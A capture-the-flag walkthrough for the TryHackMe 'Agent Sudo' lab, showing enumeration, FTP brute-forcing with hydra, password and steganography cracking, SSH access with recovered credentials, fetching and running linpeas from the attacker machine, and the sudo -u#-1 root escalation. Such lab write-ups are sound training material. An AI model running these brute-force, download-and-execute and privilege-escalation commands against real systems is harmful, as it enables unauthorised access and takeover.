# Agent Sudo

**Room Link:** [https://tryhackme.com/room/agentsudoctf](https://tryhackme.com/room/agentsudoctf)



## Enumerate

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

```
nmap -p- $VICTIM
```

### TCP/80 - HTTP

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt 
```

<figure><img src="../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>







<figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

### Burp

Change the user-agent to C

**From**

<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

**To**

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

## Hash cracking and brute-force

### TCP/21 - FTP&#x20;

**Kali**

```
hydra -l chris -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt ftp://$VICTIM
```

<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ftp $VICTIM
Username: chris
Password: crystal
```

<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
binwalk cutie.png 
binwalk cutie.png -e
```

<figure><img src="../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
zip2john 8702.zip > secure_john.txt
john --wordlist=/usr/share/wordlists/rockyou.txt secure_john.txt 
```

<figure><img src="../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
7z e 8702.zip
Password: alien
```

<figure><img src="../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

### Cyber Chef

Link: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

<figure><img src="../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
steghide extract -sf cute-alien.jpg
Password: Alien51
```

<figure><img src="../../.gitbook/assets/image (133).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ssh james@$VICTIM
Password: hackerrules!
```

**Victim**

```
ls
```

<figure><img src="../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
scp james@$VICTIM:/home/james/Alien_autospy.jpg .
```

### LinPeas

Linpeas found that sudo is vulnerable, so I looked at the version online and found a way to escalate my privilege's.&#x20;

**Kali**

```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
python2 -m SimpleHTTPServer 81
```

**Victim**

```
cd /tmp/
wget http://$KALI:81/linpeas.sh
chmod +x linpeas.sh 
./linpeas.sh
```

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

## **Privilege Escalation**

**Link:** [https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)

**Victim**

```
sudo -u#-1 /bin/bash
```

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>





















